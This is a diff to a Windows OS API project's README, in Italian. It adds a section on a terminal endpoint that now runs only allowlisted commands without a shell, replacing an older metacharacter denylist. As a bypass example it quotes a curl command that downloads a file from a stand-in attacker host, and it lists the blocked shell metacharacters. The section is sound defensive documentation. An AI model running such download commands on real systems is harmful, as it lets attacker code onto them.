@@ -183,6 +183,36 @@ python scripts/live_windows_smoke.py
 On Linux, `pytest -m windows` collects import/smoke tests; runtime Win32 tests skip with clear reasons.
 Without a real Windows **interactive desktop**, UIA tree / mouse click / screenshot may skip (`requires_display`); process, FS, registry, clipboard, and SendInput API calls still run.
 
+## Terminal — allowlist, non denylist
+
+`POST /v1/terminal/execute` esegue **solo comandi registrati**, come argv e con
+`shell=False`. Non c'e' una shell in cui iniettare.
+
+```bash
+python -c "from windows_os_api.os.terminal.allowlist import registered_commands; print(registered_commands(include_admin=True))"
+```
+
+Il registro sta in `windows_os_api/os/terminal/allowlist.py`: ogni voce dichiara
+numero massimo di argomenti, un pattern che ogni argomento deve rispettare, e se
+richiede la policy ADMIN. Estenderlo e' una modifica di codice, di proposito —
+una chiave di configurazione che allarga a runtime un confine di sicurezza
+riporta l'allowlist a essere un allow-anything.
+
+`ADMIN` amplia il registro, non lo disattiva.
+
+Il comando viene tokenizzato con le regole di quoting dell'host: `posix=False`
+su Windows, dove `\` e' un separatore di path, non un escape. Sotto le regole
+POSIX `C:\` viene letto come escape rotto e il chiamante si sente dire che il
+suo quoting e' sbagliato, invece della verita': il comando non e' registrato.
+Cambia il messaggio d'errore, non l'insieme dei comandi permessi — cio' che non
+sta nel registro non viene eseguito su nessuna piattaforma.
+
+**Breaking change rispetto alla versione precedente**: prima il comando veniva
+filtrato con una denylist di metacaratteri (`; && | ` `` ` `` ` $( \n`) e poi
+eseguito con `shell=True`. Un comando senza quei caratteri passava e veniva
+eseguito: `curl http://evil/x -o /tmp/x` non ne contiene nessuno. Chi oggi passa
+comandi arbitrari a questo endpoint deve registrarli.
+
 ## Forensic audit
 
 ```bash
